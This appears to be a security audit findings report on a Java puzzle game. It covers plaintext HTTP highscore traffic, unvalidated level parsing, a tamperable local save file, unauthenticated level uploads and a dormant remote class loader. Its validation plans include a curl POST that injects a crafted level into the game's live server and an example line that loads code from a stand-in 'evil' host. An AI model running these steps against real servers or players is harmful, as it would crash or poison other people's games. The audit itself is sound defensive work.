findings.title: Highscore get/save exchanged over plain HTTP, spoofable by network attacker
findings.entry_point: Startup background thread ApoSlitherLinkPanel.loadLevels() (game/ApoSlitherLinkPanel.java:133-141) calls ApoHighscore.load(); editor upload calls ApoHighscore.save() (game/ApoSlitherLinkEditor.java:117-121)
findings.sink: URLConnection to http://www.apo-games.de/apoSlitherLink/get_highscore.php and /save_highscore.php (URLs defined in org/apogames/ApoConstants.java:25-26, B_ONLINE hardcoded true at line 23)
findings.data_path: ApoSlitherLinkPanel.loadLevels() -> new Thread() -> ApoHighscore.getInstance().load() -> new URL(HIGHSCORE_GETPHP).openConnection() -> DataInputStream(urlConn.getInputStream()).readLine(); responses stored raw into names/levels/solution lists. Upload path: ApoSlitherLinkEditor.mouseButtonFunction(UPLOAD) -> ApoHighscore.save(levelString, solvedLevelString, "Apo") -> printout.writeBytes().
findings.attack_scenario: Attacker on the same LAN (ARP spoofing) or any DNS-hijacking position intercepts the port-80 traffic: (1) reads which puzzles the victim solved/uploaded; (2) rewrites the get_highscore.php response body to inject arbitrary 'level' strings, which the client adds as playable custom levels (see ApoSlitherLink-02); (3) forges submissions attributed to other players.
findings.preconditions: Victim plays the desktop build (default state: B_ONLINE=true, B_APPLET=false); attacker has an on-path or DNS position; apo-games.de still resolvable/live (or attacker controls resolution).
findings.validation_plan: Launch apoSlitherLink.ApoSlitherLinkMain under tcpdump/Wireshark: plaintext HTTP POST to www.apo-games.de/apoSlitherLink/get_highscore.php is visible at startup. In a lab, point www.apo-games.de to a local netcat/HTTP server returning three lines ('0404    ', 'aaaa', 'X') and observe a custom level appear in the Custom menu.

findings.title: Server-supplied level strings parsed with unvalidated dimensions (crash / oversized allocations)
findings.entry_point: HTTP response of get_highscore.php: each line becomes a level via ApoSlitherLinkPanel.loadLevels() -> ApoSlitherLinkLevels.addCustomLevel(String) (apoSlitherLink/level/ApoSlitherLinkLevels.java:177-184) with no validation
findings.sink: Array allocation new ApoSlitherLinkLevelHelp[height][width] and per-cell parsing in ApoSlitherLinkLevel.setLevel(String,boolean) (apoSlitherLink/level/ApoSlitherLinkLevel.java:407-460)
findings.data_path: get_highscore.php body -> ApoHighscore.load() (help/ApoHighscore.java:129-138) -> ApoSlitherLinkPanel.loadLevels():138 addCustomLevel(highscore.getLevels().get(i)) -> user opens 'Custom' menu -> ApoSlitherLinkPanel.startCustomLevel() -> ApoSlitherLinkLevel.setCustomLevels() -> setLevel(customLevel.getLevelString(), true) -> Integer.valueOf("-4") = -4 -> NegativeArraySizeException (uncaught) on the EDT
findings.attack_scenario: Attacker uploads a 'puzzle' whose level string begins with '-4' (or MITMs the get_highscore.php response to include such a line). Every player who downloads the shared levels and clicks Custom gets an uncaught exception in the event thread: the game freezes/aborts. Values up to '99' allocate 9801 cell objects plus render images per entry instead.
findings.preconditions: B_ONLINE=true (hardcoded default); malicious entry served by apo-games.de or injected by an on-path attacker (see ApoSlitherLink-01); victim must click the Custom levels button for the allocation path.
findings.validation_plan: Unit-level: call new ApoSlitherLinkLevel(null).setLevel("-101", true) and observe NegativeArraySizeException at line 425. End-to-end: point www.apo-games.de at a stub server whose response contains '-4-4' lines, start the game, click 'Custom', observe the EDT exception and dead UI.

findings.title: Hand-parsed local save file 'highscore.apo' triggers uncaught exceptions and unbounded image allocation at startup
findings.entry_point: Local file 'highscore.apo' resolved against the process working directory, read at every launch: ApoSlitherLinkPanel.init() -> loadLevels() -> this.io.readLevel("highscore.apo") (game/ApoSlitherLinkPanel.java:127)
findings.sink: makeSolvedImage() in apoSlitherLink/level/ApoSlitherLinkLevelsHelp.java:166-265 - loop indexes level.getLevel()[y][x] using dimensions parsed from the file's second string (lines 188-241) and allocates a BufferedImage sized by the first string (line 247)
findings.data_path: highscore.apo -> ApoSlitherLinkLevelIO.readLevel(DataInputStream) (level/ApoSlitherLinkLevelIO.java:71-81: readInt size, then size pairs of readUTF level/solution strings) -> ApoSlitherLinkPanel.loadLevels():129-132 checkLevelsIsIn()/addCustomsLevels() -> help.setSolvedLevelString(...) and makeSolvedImage(level). Dimensions inside both UTF strings are attacker-chosen and never cross-checked.
findings.attack_scenario: (a) Crash-loop DoS: a file whose solution string declares 99x99 while the level string declares 04x04 causes ArrayIndexOutOfBoundsException during loadLevels() at startup; the game never reaches the menu until the file is deleted. (b) Memory exhaustion: thousands of consistent entries like level='2525'+625 spaces, solution='2525'+625 'a' chars each allocate ~2400x2400 px ARGB images (~23 MB) per entry from a ~2 KB file, exhausting the heap.
findings.preconditions: Ability to plant/modify highscore.apo in the game's working directory (local malware already running as the user, a shared folder, or social engineering). No network needed.
findings.validation_plan: Craft the file with Java: dos.writeInt(1); dos.writeUTF("0404    "); dos.writeUTF("9999"+...); place next to the jar, launch ApoSlitherLinkMain -> stack trace during init, no window content; remove file -> launches. Repeat with N consistent 25x25 entries to drive heap toward OOM.

findings.title: Unauthenticated level upload feeds a shared pool auto-downloaded by all clients
findings.entry_point: Editor 'Upload' button -> ApoHighscore.save() posts level/solution/name as form data; the same pool is downloaded by every client at startup via get_highscore.php
findings.sink: save_highscore.php accepts arbitrary attacker-chosen level/solution strings (no signature, token, or auth visible in the client protocol; name is the constant "Apo", not a player identity)
findings.data_path: ApoSlitherLinkEditor.mouseButtonFunction(UPLOAD) (lines 112-122) -> new Thread -> ApoHighscore.save() (help/ApoHighscore.java:55-97) -> printout.writeBytes("level=...&solution=...&name=Apo") in cleartext; victims later consume these strings through ApoSlitherLinkPanel.loadLevels() (see ApoSlitherLink-01/-02).
findings.attack_scenario: An attacker scripts POSTs of crafted level strings (e.g. dimension bombs or garbage puzzles) directly to save_highscore.php - the game client itself performs no authentication, so neither does the minimal protocol. All players silently receive the poisoned entries as custom levels at next start; combined with ApoSlitherLink-02 this turns into a remote crash delivered through the official channel.
findings.preconditions: save_highscore.php live and accepting submissions exactly as the client sends them (server-side behavior inferred from the client protocol; the PHP source is not in this repo).
findings.validation_plan: Replay the exact request: curl -X POST -d 'level=0404%20%20%20%20&solution=a&name=Apo' http://www.apo-games.de/apoSlitherLink/save_highscore.php, then run the stock client and confirm the injected level appears under Custom. If the original endpoint is offline, host a mirror and repoint DNS.

findings.title: ApoClassLoader can instantiate classes from arbitrary URLs/filesystems but is dead code in this variant
findings.entry_point: Constructor arguments (path, classname) - in non-applet mode a filesystem path, in applet mode any URL (lines 65-68)
findings.sink: URLClassLoader.loadClass() followed by Class.newInstance() at lines 73-75: executes static initializers and the no-arg constructor of whatever class is found at the supplied location
findings.data_path: Theoretically: attacker-controlled path/classname -> getMyClass() -> URLClassLoader over http:// or file:// URL -> loadClass -> newInstance -> attacker constructor runs with full user privileges. In THIS variant the chain is severed: repo-wide search finds no instantiation of ApoClassLoader and no caller of getMyClass(); the related ApoFileFilter("class") in ApoSlitherLinkComponent.java:30 hints at a removed loader feature.
findings.attack_scenario: None exploitable as shipped. If a sibling variant clones this framework class and wires it to a server-supplied classname (the corpus' clone-and-own pattern), serving one HTTP response yields arbitrary code execution on the player's machine.
findings.preconditions: For a future/cloned wiring only: some code must pass an attacker-influenced path/classname into ApoClassLoader and invoke getMyClass(); none exists in ApoSlitherLink today.
findings.validation_plan: Static: rg 'ApoClassLoader|getMyClass' across the tree returns only the class definition itself. Dynamic confirmation would require first adding a caller, e.g. new ApoClassLoader("http://evil/","Evil").getMyClass(), then observing the constructor side effect - i.e. the weakness is latent, not reachable.

categories_checked_and_absent: untrusted_deserialization - no ObjectInputStream/readObject anywhere (grep across all 62 files); level/save parsing uses manual DataInputStream readInt/readUTF only
weak_integrity_check - ApoHelp.getMd5Digest() with MD5 exists (org/apogames/help/ApoHelp.java:285-294) but has zero callers in this variant; dead cloned infrastructure, not a live weakness

path_traversal - all file writes/reads use JFileChooser results or hardcoded constants ("highscore.apo", "images/logo.png"); ApoSlitherLinkPanel.loadLevel/saveLevel are empty stubs (game/ApoSlitherLinkPanel.java:316-323); no path composition from untrusted strings reaches FileInputStream/FileOutputStream
credential_or_secret_exposure - no credentials, tokens, or personal data transmitted; upload name is the hardcoded constant "Apo"

legacy_sandbox_assumption - applet classes exist (ApoAppletBufferedStrategy sets B_APPLET=true) but no getParameter() calls; APPLET_LEVEL constant (ApoSlitherLinkComponent.java:26) is unreferenced; AudioPlayer's http://www.apo-games.de branch (sound/AudioPlayer.java:68) is dead because BInJAR is hardcoded true (line 19) and no sound is ever registered; ApoIO.writeLevel()'s HTTP-POST branch (org/apogames/ApoIO.java:167-170) is unreachable because saveLevels() guards on !B_APPLET
notes: All 62 .java files were swept with greps for network/IO/crypto/reflection/native APIs; 29 were read in full. The corpus checkout nests the project one level deeper than expected: every path above is relative to <source-root>/Users/eliahilse/Documents/GitHub/B/apogames/Java/ApoSlitherLink/. This is the leanest variant audited so far: no replay/cheat formats (.mar/.rep/etc.), no ObjectInputStream, no JNI, and the entire sound subsystem is inert (loadSound calls commented out at ApoSlitherLinkComponent.java:100-101, bSound defaults false). Clone-and-own evidence: org/apogames/* (ApoConstants URLs, ApoHighscore, ApoClassLoader, ApoIO) is the shared framework where flaws propagate; a copy-paste bug in the shared-ish ApoSlitherLinkLevelsHelp constructor (line 55 reads height from the just-initialized empty solvedLevelString, so this.height is always -1) marks the level-help class as cloned between variants. Save state is written to CWD-relative 'highscore.apo' (not user.home) on quit via ApoSlitherLinkMenu.java:112 / ApoSlitherLinkMain.exitFrame():33. Local cheating is trivial by design: editing highscore.apo marks any built-in puzzle solved (checkLevelsIsIn matches level strings), which matters for the corpus' local-tamper threat model but is ordinary for an offline puzzle game.
